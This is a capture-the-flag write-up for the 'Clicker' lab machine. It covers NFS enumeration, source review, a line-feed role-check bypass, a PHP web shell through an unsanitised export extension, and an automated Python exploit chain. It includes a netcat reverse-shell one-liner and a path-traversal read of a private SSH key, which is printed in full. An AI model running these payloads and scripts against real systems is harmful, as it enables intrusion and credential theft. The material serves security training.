# clicker

# Clicker

| Hostname | Difficulty |
| --- | --- |
| clicker | Medium |

Machine IP: 10.10.11.232 :

```bash
TARGET=10.10.11.232
```

## Initial Reconnaissance

### Ports and services

scan all open ports :

```
nmap -p- $TARGET --open
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-24 19:40 UTC
Nmap scan report for 10.10.11.232
Host is up (0.022s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
37393/tcp open  unknown
38393/tcp open  unknown
41533/tcp open  unknown
42173/tcp open  unknown
48179/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 11.17 seconds
```

scan deeper these ports :

```
nmap -p22,80,111,2049,37393,38393,41533,42173,48179 $TARGET -sC -sV -A
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-24 19:43 UTC
Nmap scan report for 10.10.11.232
Host is up (0.019s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 89d7393458a0eaa1dbc13d14ec5d5a92 (ECDSA)
|_  256 b4da8daf659cbbf071d51350edd81130 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://clicker.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37829/tcp6  mountd
|   100005  1,2,3      42898/udp   mountd
|   100005  1,2,3      48179/tcp   mountd
|   100005  1,2,3      60154/udp6  mountd
|   100021  1,3,4      38020/udp6  nlockmgr
|   100021  1,3,4      39935/tcp6  nlockmgr
|   100021  1,3,4      40099/udp   nlockmgr
|   100021  1,3,4      42173/tcp   nlockmgr
|   100024  1          37464/udp   status
|   100024  1          38393/tcp   status
|   100024  1          45106/udp6  status
|   100024  1          57269/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
37393/tcp open  mountd   1-3 (RPC #100005)
38393/tcp open  status   1 (RPC #100024)
41533/tcp open  mountd   1-3 (RPC #100005)
42173/tcp open  nlockmgr 1-4 (RPC #100021)
48179/tcp open  mountd   1-3 (RPC #100005)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 42173/tcp)
HOP RTT      ADDRESS
1   19.08 ms 10.10.14.1
2   19.15 ms 10.10.11.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds
```

We can identify :

- SSH on port 22
- web application on port 80, with the hostname "clicker.htb"
- RPC on port 111
- NFS on port 2049

### Web application

```
echo "$TARGET    clicker.htb" >> /etc/hosts
```

The landing page :

![Untitled](assets/web_home.png)

info : 

![Untitled](assets/web_info.png)

Let’s register :

![Untitled](assets/web_register.png)

- username = john
- password = doe

![Untitled](assets/web_register_success.png)

Then login :

![Untitled](assets/web_login.png)

![Untitled](assets/web_logged_in.png)

The profile page :

![Untitled](assets/web_profile.png)

And play :

![Untitled](assets/web_play.png)

After playing with a few clicks, we can leave by clicking on the button “Save and close”. Using Burpsuite, we can intercept the HTTP request :

```
GET /save_game.php?clicks=7&level=2 HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=2fvl5ddpu3ndobpnsas7mfggo8
Upgrade-Insecure-Requests: 1
```

the current number of clicks and level are simply given as parameters in the URL. 

The response provide the message displayed :

```
HTTP/1.1 302 Found
Date: Tue, 24 Oct 2023 21:30:00 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /index.php?msg=Game has been saved!
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

![Untitled](assets/web_game_saved.png)

Using burpsuite repeater, it seems possible to cheat the saved game :

![Untitled](assets/burp_save_game.png)

![Untitled](assets/web_profile_saved.png)

### NFS

```
nmap -p 111,2049 -script nfs-showmount $TARGET
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-24 19:53 UTC
Nmap scan report for clicker.htb (10.10.11.232)
Host is up (0.020s latency).

PORT     STATE SERVICE
111/tcp  open  rpcbind
| nfs-showmount:
|_  /mnt/backups *
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

same with:

```
showmount --exports $TARGET
```

```
Export list for 10.10.11.232:
/mnt/backups *
```

note: when using a container, it must be privileged in order to be able to mount the NFS share

```
mkdir /mnt/clicker
mount -t nfs 10.10.11.232:/mnt/backups /mnt/clicker
ls /mnt/clicker
```

there is a zip file :

```
clicker.htb_backup.zip
```

copy to our host to be analysed :

```
cp /mnt/clicker/clicker.htb_backup.zip /workspace/clicker/
cd /workspace/clicker/
unzip clicker.htb_backup.zip
```

```
Archive:  clicker.htb_backup.zip
   creating: clicker.htb/
  inflating: clicker.htb/play.php
  inflating: clicker.htb/profile.php
  inflating: clicker.htb/authenticate.php
  inflating: clicker.htb/create_player.php
  inflating: clicker.htb/logout.php
   creating: clicker.htb/assets/
  inflating: clicker.htb/assets/background.png
  inflating: clicker.htb/assets/cover.css
  inflating: clicker.htb/assets/cursor.png
   creating: clicker.htb/assets/js/
  inflating: clicker.htb/assets/js/bootstrap.js.map
  inflating: clicker.htb/assets/js/bootstrap.bundle.min.js.map
  inflating: clicker.htb/assets/js/bootstrap.min.js.map
  inflating: clicker.htb/assets/js/bootstrap.bundle.min.js
  inflating: clicker.htb/assets/js/bootstrap.min.js
  inflating: clicker.htb/assets/js/bootstrap.bundle.js
  inflating: clicker.htb/assets/js/bootstrap.bundle.js.map
  inflating: clicker.htb/assets/js/bootstrap.js
   creating: clicker.htb/assets/css/
  inflating: clicker.htb/assets/css/bootstrap-reboot.min.css
  inflating: clicker.htb/assets/css/bootstrap-reboot.css
  inflating: clicker.htb/assets/css/bootstrap-reboot.min.css.map
  inflating: clicker.htb/assets/css/bootstrap.min.css.map
  inflating: clicker.htb/assets/css/bootstrap.css.map
  inflating: clicker.htb/assets/css/bootstrap-grid.css
  inflating: clicker.htb/assets/css/bootstrap-grid.min.css.map
  inflating: clicker.htb/assets/css/bootstrap-grid.min.css
  inflating: clicker.htb/assets/css/bootstrap.min.css
  inflating: clicker.htb/assets/css/bootstrap-grid.css.map
  inflating: clicker.htb/assets/css/bootstrap.css
  inflating: clicker.htb/assets/css/bootstrap-reboot.css.map
  inflating: clicker.htb/login.php
  inflating: clicker.htb/admin.php
  inflating: clicker.htb/info.php
  inflating: clicker.htb/diagnostic.php
  inflating: clicker.htb/save_game.php
  inflating: clicker.htb/register.php
  inflating: clicker.htb/index.php
  inflating: clicker.htb/db_utils.php
   creating: clicker.htb/exports/
  inflating: clicker.htb/export.php
```

This is a backup of the web site

in db_utils.php, there a possible SQL injection :

```php
// ONLY FOR THE ADMIN
function get_top_players($number) {
	global $pdo;
	$stmt = $pdo->query("SELECT nickname,clicks,level FROM players WHERE clicks >= " . $number);
	$result = $stmt->fetchAll(PDO::FETCH_ASSOC);
	return $result;
}
```

This code is called from the admin.php file :

```php
<main class="px-3">
    <?php
      $threshold = 1000000;
      $top_players = get_top_players($threshold);
```

To be able to call the admin.php file, there is a condition (in admin.php file):

```php
if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}
```

we need to have $_SESSION["ROLE"] set to “admin”

In “save_game.php” :

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
	
}
?>
```

the save_profile function in profile.php :

```php
function save_profile($player, $args) {
	global $pdo;
  	$params = ["player"=>$player];
	$setStr = "";
  	foreach ($args as $key => $value) {
    		$setStr .= $key . "=" . $pdo->quote($value) . ",";
	}
  	$setStr = rtrim($setStr, ",");
  	$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
  	$stmt -> execute($params);
}
```

This is then loaded from load_profile() function in the same file :

```php
function load_profile($player) {
	global $pdo;
	$params = ["player"=>$player];
	$stmt = $pdo->prepare("SELECT nickname, role, clicks, level FROM players WHERE username = :player");
	$stmt->execute($params);
	if ($stmt->rowCount() > 0) {
		$row = $stmt->fetch(PDO::FETCH_ASSOC);
		return $row;
	}
	return array();
}
```

## Initial access

### Move from player to admin

It is possible to alter the profile information in  “save_game.php”, even with the test :

```php
		if (strtolower($key) === 'role') {
```

So we could call something like : “/save_game.php?clicks=7&level=2&role=admin”

But we have to workaround the test on role.

In order to bypass the comparison, il is possible to use a common trick by adding a line feed after the name “role”.

Reference: [https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)

And here are some python scripts to automate the process :

Create_account.py :

```python
import requests

BaseUrl="http://clicker.htb"

payload = {'username':'john', 'password':'doe'}
url = BaseUrl+'/create_player.php'

with requests.Session() as s:
    r = s.post(url, data=payload)
    print( r )
    cookie = {'PHPSESSID': requests.utils.dict_from_cookiejar(s.cookies)['PHPSESSID']}
```

Set_admin.py :

```python
import requests

BaseUrl="http://clicker.htb"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

print("[ ] Login")

payload = {'username':'john', 'password':'doe'}
url = BaseUrl+'/authenticate.php'

with requests.Session() as s:
    r = s.post(url, data=payload, allow_redirects=False, proxies=proxies, verify=False)
    print( "Response code: " + str(r.status_code ) )
    cookie = {'PHPSESSID': requests.utils.dict_from_cookiejar(s.cookies)['PHPSESSID']}
    print( "Location Header: " + r.headers['Location'] )
    print ( "Cookie: " + str(cookie) )
    print( "Content: " + str(r.content) )

print("[ ] set role to Admin")

url = BaseUrl+'/save_game.php?clicks=37&level=13&role%0a=Admin'

with requests.Session() as s:
    r = s.get(url, cookies=cookie, allow_redirects=False, proxies=proxies, verify=False )
    print( "Response code: " + str(r.status_code ) )
    try:
        print( "Location Header: " + r.headers['Location'] )
    except:
        print("no location")
    for h in r.headers:
        print( "Header: " + h + ": " + r.headers[h] )
    print( "Content: " + str(r.content) )
```

When executing this script, we get :

```
[ ] Login
Response code: 302
Location Header: /index.php
Cookie: {'PHPSESSID': 'a031m0ccod0o1pockijak01lss'}
Content: b''
[ ] set role to Admin
Response code: 302
Location Header: /index.php?msg=Game has been saved!
Header: Date: Thu, 26 Oct 2023 16:39:59 GMT
Header: Server: Apache/2.4.52 (Ubuntu)
Header: Expires: Thu, 19 Nov 1981 08:52:00 GMT
Header: Cache-Control: no-store, no-cache, must-revalidate
Header: Pragma: no-cache
Header: Location: /index.php?msg=Game has been saved!
Header: Content-Length: 0
Header: Connection: close
Header: Content-Type: text/html; charset=UTF-8
Content: b''
```

And when logon with the browser (login = “john” , password = “doe”) :

![Untitled](assets/web_admin.png)

We have gained access to a new page :

![Untitled](assets/web_top_players.png)

From this page, we can request an export :

![Untitled](assets/web_export.png)

We do not get a download file, this is only on the web server. 

We are able to get this file from [http://clicker.htb/exports/top_players_gqkhqlg4.txt](http://clicker.htb/exports/top_players_gqkhqlg4.txt)

```
Nickname:  Clicks:  Level: 
Nickname: admin Clicks: 999999999999999999 Level: 999999999
Nickname: ButtonLover99 Clicks: 10000000 Level: 100
Nickname: Paol Clicks: 2776354 Level: 75
Nickname: Th3Br0 Clicks: 87947322 Level: 1
```

We can also request to export as HTML, or json.

But when looking at the web requests :

![Untitled](assets/burp_export.png)

### Export

This code is called from the admin.php file :

```php
<main class="px-3">
    <?php
      $threshold = 1000000;
      $top_players = get_top_players($threshold);
```

The HTTP request is providing the threshold.

If we look at the export.php file, we can spot something interesting in this code :

```php
$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
file_put_contents($filename, $s);
```

When writing the export file, the code uses what is provided from the URL in the “extension” parameter, without any sanitation. We could possibly create a PHP file that could be executed on the server side.

To check it, we can repeat an export request from Burpsuite :

![Untitled](assets/burp_export-2.png)

This is accepted by the server, and the export file exists :

![Untitled](assets/web_export_file.png)

So we could use it, only if we are able to inject some PHP code in a field that is exported, so nickname, number of clicks, or level number.

Just in the same we have altered the role property, we can alter the nickname property. The code in db_utils.php can confirme the exact property name :

```php
$stmt = $pdo->prepare("SELECT nickname, clicks, level FROM players WHERE username = :player");
```

In order to automate the whole process, here is a python script to do it :

```python
#!/usr/bin/python3

import requests
import urllib.parse

BaseUrl="http://clicker.htb"
SessionCookie = None

# ---------------------------------------------------------
def printHttpResponse(httpRequest):
    print( "HTTP Response:" )
    print( "   Response code: " + str( httpRequest.status_code ) )
    print("   Headers:")
    for h in httpRequest.headers:
        print( "      " + h + ": " + httpRequest.headers[h] )
    print("   Cookies:")
    cookies = requests.utils.dict_from_cookiejar(httpRequest.cookies)
    for cooky in cookies.keys():
        print( "      " + str(cooky) + " : " + cookies[cooky] )
    print( "   Content:" )
    print( str(httpRequest.content) )

# ---------------------------------------------------------
def httpGet(url):
    with requests.Session() as s:
        print("URL: " + url)
        print("Session cookie: " + str(SessionCookie) )
        r = s.get(BaseUrl + url, cookies=SessionCookie, allow_redirects=False)
        printHttpResponse( r )
        return r

def httpPost(url,payload):
    with requests.Session() as s:
        print("URL: " + url)
        print("Payload: " + str(payload) )
        print("Session cookie: " + str(SessionCookie) )
        r = s.post(BaseUrl + url, cookies=SessionCookie, data=payload, allow_redirects=False)
        printHttpResponse( r )
        return r

# ---------------------------------------------------------
def commandCreatePlayer():
    print("[ ] Register")
    payload = {'username':'john', 'password':'doe'}
    r = httpPost('/create_player.php', payload )

    assert r.status_code == 302
    assert r.headers['Location'] == "/index.php?msg=Successfully registered"

    return r

# ---------------------------------------------------------
def commandLogin():
    print("[ ] Login")
    payload = {'username':'john', 'password':'doe'}
    r = httpPost( '/authenticate.php', payload)

    assert r.status_code == 302
    assert r.headers['Location'] == "/index.php" or r.headers['Location'] == "/login.php?err=Authentication Failed"
    return r

# ---------------------------------------------------------
def commandSaveGame():
    print("[ ] Save Game: set role as admin + nickname")
    assert SessionCookie != None

    payload="<?php system($_GET['cmd']);?>"
    url = '/save_game.php?clicks=13371337&level=666&role%0a=Admin&nickname='+ urllib.parse.quote( payload)

    r = httpGet(url)
    assert r.status_code == 302
    assert r.headers['Location'] == "/index.php?msg=Game has been saved!"
    return r

# ---------------------------------------------------------
def commandRequestExport():
    print("[ ] request export")

    assert SessionCookie != None
    
    payload={'threshold': 1,'extension':'php'}

    r = httpPost('/export.php', payload )

    assert r.status_code == 302
    assert r.headers['Location'].startswith("/admin.php?msg=Data has been saved in exports/")
    assert r.headers['Location'].endswith(".php")

    return r

# ---------------------------------------------------------
def commandGetExport( ExportFile ):
    print("[ ] reading export")

    url = '/' + ExportFile + '?cmd=id'

    r = httpGet(url)

    assert r.status_code == 200

    return r

# Try to login
r = commandLogin()
if r.headers['Location'].endswith("Authentication Failed"):
    print( "[ ] login failed, try to create user first" )
    r = commandCreatePlayer()
    # re-login, it should be fine now
    r = commandLogin()

# ensure login is successfull
assert r.headers['Location'] == "/index.php"
# save cooky value
SessionCookie = {'PHPSESSID': requests.utils.dict_from_cookiejar(r.cookies)['PHPSESSID']}
print ( "[ ] Session Cookie: " + str(SessionCookie) )

r = commandSaveGame()
r = commandRequestExport()

ExportFile = r.headers['Location'].replace('/admin.php?msg=Data has been saved in ','')
print("[ ] Exported file: " + ExportFile)

r = commandGetExport( ExportFile )
```

This script is doing it all from the create player, the login, set role and nickname, request an export, and get an export.

When executed, we are able to execute a system command :

```
[ ] Login
URL: /authenticate.php
Payload: {'username': 'john', 'password': 'doe'}
Session cookie: None
HTTP Response:
   Response code: 302
   Headers:
      Date: Sat, 28 Oct 2023 15:22:34 GMT
      Server: Apache/2.4.52 (Ubuntu)
      Set-Cookie: PHPSESSID=3dnelk59tdkbg13p012thk98up; path=/
      Expires: Thu, 19 Nov 1981 08:52:00 GMT
      Cache-Control: no-store, no-cache, must-revalidate
      Pragma: no-cache
      Location: /index.php
      Content-Length: 0
      Keep-Alive: timeout=5, max=100
      Connection: Keep-Alive
      Content-Type: text/html; charset=UTF-8
   Cookies:
      PHPSESSID : 3dnelk59tdkbg13p012thk98up
   Content:
b''
[ ] Session Cookie: {'PHPSESSID': '3dnelk59tdkbg13p012thk98up'}
[ ] Save Game: set role as admin + nickname
URL: /save_game.php?clicks=13371337&level=666&role%0a=Admin&nickname=%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E
Session cookie: {'PHPSESSID': '3dnelk59tdkbg13p012thk98up'}
HTTP Response:
   Response code: 302
   Headers:
      Date: Sat, 28 Oct 2023 15:22:34 GMT
      Server: Apache/2.4.52 (Ubuntu)
      Expires: Thu, 19 Nov 1981 08:52:00 GMT
      Cache-Control: no-store, no-cache, must-revalidate
      Pragma: no-cache
      Location: /index.php?msg=Game has been saved!
      Content-Length: 0
      Keep-Alive: timeout=5, max=100
      Connection: Keep-Alive
      Content-Type: text/html; charset=UTF-8
   Cookies:
   Content:
b''
[ ] request export
URL: /export.php
Payload: {'threshold': 1, 'extension': 'php'}
Session cookie: {'PHPSESSID': '3dnelk59tdkbg13p012thk98up'}
HTTP Response:
   Response code: 302
   Headers:
      Date: Sat, 28 Oct 2023 15:22:34 GMT
      Server: Apache/2.4.52 (Ubuntu)
      Expires: Thu, 19 Nov 1981 08:52:00 GMT
      Cache-Control: no-store, no-cache, must-revalidate
      Pragma: no-cache
      Location: /admin.php?msg=Data has been saved in exports/top_players_ysdboq9m.php
      Content-Length: 0
      Keep-Alive: timeout=5, max=100
      Connection: Keep-Alive
      Content-Type: text/html; charset=UTF-8
   Cookies:
   Content:
b''
[ ] Exported file: exports/top_players_ysdboq9m.php
[ ] reading export
URL: /exports/top_players_ysdboq9m.php?cmd=id
Session cookie: {'PHPSESSID': '3dnelk59tdkbg13p012thk98up'}
HTTP Response:
   Response code: 200
   Headers:
      Date: Sat, 28 Oct 2023 15:22:34 GMT
      Server: Apache/2.4.52 (Ubuntu)
      Vary: Accept-Encoding
      Content-Encoding: gzip
      Content-Length: 243
      Keep-Alive: timeout=5, max=100
      Connection: Keep-Alive
      Content-Type: text/html; charset=UTF-8
   Cookies:
   Content:
b'<table><thead>  <tr>    <th scope="col">Nickname</th>    <th scope="col">Clicks</th>    <th scope="col">Level</th>  </tr></thead><tbody>  <tr>    <th scope="row">uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</th>    <td>13371337</td>    <td>666</td>  </tr>  <tr>    <th scope="row">admin</th>    <td>999999999999999999</td>    <td>999999999</td>  </tr>  <tr>    <th scope="row">ButtonLover99</th>    <td>10000000</td>    <td>100</td>  </tr>  <tr>    <th scope="row">uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</th>    <td>13371337</td>    <td>666</td>  </tr>  <tr>    <th scope="row">Paol</th>    <td>2776354</td>    <td>75</td>  </tr>  <tr>    <th scope="row">Th3Br0</th>    <td>87947322</td>    <td>1</td>  </tr></tbody></table>'
```

In the “save game” command, it replace the current nickname with a PHP command execution :

```python
payload="<?php system($_GET['cmd']);?>"
```

When requested the exported file as PHP, the executed command is “id”, and we get it in the exported file :

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell

Replace the command with :

```python
url = '/' + ExportFile + '?cmd='+ urllib.parse.quote("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.23 9001 >/tmp/f")
```

open a shell listener :

```bash
rlwrap nc -lvnp 9001
```

![Untitled](assets/user_shell.png)

### Post-Exploitation

### Host Reconnaissance

In the /home folder, there is only the user jack :

```bash
ls /home
jack
id jack
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

The current user “www-data” should not have sudoer rights. But there are some SUID binaries :

```bash
find / -perm -4000 -print 2> /dev/null
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/sbin/mount.nfs
/opt/manage/execute_query
```

“/opt/manage/execute_query” is a custom one :

```bash
ls -la /opt/manage/execute_query
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 /opt/manage/execute_query
```

we would move to jack user.

### Lateral Movement to jack

There is a README file in the folder of this executable :

```
cat /opt/manage/README.txt
Web application Management

Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin
```

Let’s analyse tis executable :

```bash
strings /opt/manage/execute_query
```

We can identify a fex things :

```
/home/jaH
ck/queriH
/usr/binH
/mysql -H
u clickeH
r_db_useH
r --passH
word='clH
icker_dbH
_passworH
d' clickH
er -v < H
ERROR: not enough arguments
ERROR: Invalid arguments
create.sql
populate.sql
reset_password.sql
clean.sql
File not readable or not found
```

There seem to be a command executed :

```
/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v < 
```

looks like there is a file needed that contains the SQL code to execute. That’s why we have a reference to the files :

- create.sql
- populate.sql
- reset_password.sql
- clean.sql

Let’s try :

```
/opt/manage/execute_query 3
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
UPDATE players SET password='ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82' WHERE username='admin'
--------------
```

The executed SQL file is displayed.

We can test this executable :

```
/opt/manage/execute_query 0
ERROR: Invalid arguments

/opt/manage/execute_query 5
Segmentation fault (core dumped)
```

There seem to be a hidden option 5 ?

```
/opt/manage/execute_query 3 abc def
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
UPDATE players SET password='ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82' WHERE username='admin'
--------------
```

The application accept more options without error, and interesting :

```
/opt/manage/execute_query 5 abc def
File not readable or not found
```

So this option 5 seems to require a file … To get details on which file the application reads :

```
strace /opt/manage/execute_query 5 abc def
```

```
access("/home/jack/queries/abc", R_OK)  = -1 EACCES (Permission denied)
```

Since the executable display files content, we can display some commonly known file content :

```
/opt/manage/execute_query 5 ../.bashrc
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
case $- in
    *i*)
--------------

ERROR 1064 (42000) at line 6: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'case $- in
    *i*)' at line 1
```

```
/opt/manage/execute_query 5 ../.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y
J/tSzgoR9Fko8I1UpLnHCLz2Ezsb/MrLCe8nG5TlbJrrQ4HcqnS4TKN7DZ7XW0bup3ayy1
kAAZ9Uot6ep/ekM8E+7/39VZ5fe1FwZj4iRKI+g/BVQFclsgK02B594GkOz33P/Zzte2jV
Tgmy3+htPE5My31i2lXh6XWfepiBOjG+mQDg2OySAphbO1SbMisowP1aSexKMh7Ir6IlPu
nuw3l/luyvRGDN8fyumTeIXVAdPfOqMqTOVECo7hAoY+uYWKfiHxOX4fo+/fNwdcfctBUm
pr5Nxx0GCH1wLnHsbx+/oBkPzxuzd+BcGNZp7FP8cn+dEFz2ty8Ls0Mr+XW5ofivEwr3+e
30OgtpL6QhO2eLiZVrIXOHiPzW49emv4xhuoPF3E/5CA6akeQbbGAppTi+EBG9Lhr04c9E
2uCSLPiZqHiViArcUbbXxWMX2NPSJzDsQ4xeYqFtAAAFiO2Fee3thXntAAAAB3NzaC1yc2
EAAAGBALOHkGlh3uOYhkongx262gGIEHTMJTBj7edCpjFAL1oAFds5T/P9WCf7Us4KEfRZ
KPCNVKS5xwi89hM7G/zKywnvJxuU5Wya60OB3Kp0uEyjew2e11tG7qd2sstZAAGfVKLenq
f3pDPBPu/9/VWeX3tRcGY+IkSiPoPwVUBXJbICtNgefeBpDs99z/2c7Xto1U4Jst/obTxO
TMt9YtpV4el1n3qYgToxvpkA4NjskgKYWztUmzIrKMD9WknsSjIeyK+iJT7p7sN5f5bsr0
RgzfH8rpk3iF1QHT3zqjKkzlRAqO4QKGPrmFin4h8Tl+H6Pv3zcHXH3LQVJqa+TccdBgh9
cC5x7G8fv6AZD88bs3fgXBjWaexT/HJ/nRBc9rcvC7NDK/l1uaH4rxMK9/nt9DoLaS+kIT
tni4mVayFzh4j81uPXpr+MYbqDxdxP+QgOmpHkG2xgKaU4vhARvS4a9OHPRNrgkiz4mah4
lYgK3FG218VjF9jT0icw7EOMXmKhbQAAAAMBAAEAAAGACLYPP83L7uc7vOVl609hvKlJgy
FUvKBcrtgBEGq44XkXlmeVhZVJbcc4IV9Dt8OLxQBWlxecnMPufMhld0Kvz2+XSjNTXo21
1LS8bFj1iGJ2WhbXBErQ0bdkvZE3+twsUyrSL/xIL2q1DxgX7sucfnNZLNze9M2akvRabq
DL53NSKxpvqS/v1AmaygePTmmrz/mQgGTayA5Uk5sl7Mo2CAn5Dw3PV2+KfAoa3uu7ufyC
kMJuNWT6uUKR2vxoLT5pEZKlg8Qmw2HHZxa6wUlpTSRMgO+R+xEQsemUFy0vCh4TyezD3i
SlyE8yMm8gdIgYJB+FP5m4eUyGTjTE4+lhXOKgEGPcw9+MK7Li05Kbgsv/ZwuLiI8UNAhc
9vgmEfs/hoiZPX6fpG+u4L82oKJuIbxF/I2Q2YBNIP9O9qVLdxUniEUCNl3BOAk/8H6usN
9pLG5kIalMYSl6lMnfethUiUrTZzATPYT1xZzQCdJ+qagLrl7O33aez3B/OAUrYmsBAAAA
wQDB7xyKB85+On0U9Qk1jS85dNaEeSBGb7Yp4e/oQGiHquN/xBgaZzYTEO7WQtrfmZMM4s
SXT5qO0J8TBwjmkuzit3/BjrdOAs8n2Lq8J0sPcltsMnoJuZ3Svqclqi8WuttSgKPyhC4s
FQsp6ggRGCP64C8N854//KuxhTh5UXHmD7+teKGdbi9MjfDygwk+gQ33YIr2KczVgdltwW
EhA8zfl5uimjsT31lks3jwk/I8CupZGrVvXmyEzBYZBegl3W4AAADBAO19sPL8ZYYo1n2j
rghoSkgwA8kZJRy6BIyRFRUODsYBlK0ItFnriPgWSE2b3iHo7cuujCDju0yIIfF2QG87Hh
zXj1wghocEMzZ3ELIlkIDY8BtrewjC3CFyeIY3XKCY5AgzE2ygRGvEL+YFLezLqhJseV8j
3kOhQ3D6boridyK3T66YGzJsdpEvWTpbvve3FM5pIWmA5LUXyihP2F7fs2E5aDBUuLJeyi
F0YCoftLetCA/kiVtqlT0trgO8Yh+78QAAAMEAwYV0GjQs3AYNLMGccWlVFoLLPKGItynr
Xxa/j3qOBZ+HiMsXtZdpdrV26N43CmiHRue4SWG1m/Vh3zezxNymsQrp6sv96vsFjM7gAI
JJK+Ds3zu2NNNmQ82gPwc/wNM3TatS/Oe4loqHg3nDn5CEbPtgc8wkxheKARAz0SbztcJC
LsOxRu230Ti7tRBOtV153KHlE4Bu7G/d028dbQhtfMXJLu96W1l3Fr98pDxDSFnig2HMIi
lL4gSjpD/FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg==
-----END OPENSSH PRIVATE KEY---
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1
```

Save this SSH private key in clicker-jack.id_rsa, then :

```
chmod 400 ./clicker-jack.id_rsa
ssh -i ./clicker-jack.id_rsa jack@10.10.11.232
```

note :

The Key must begin with “-----BEGIN OPENSSH PRIVATE KEY-----”

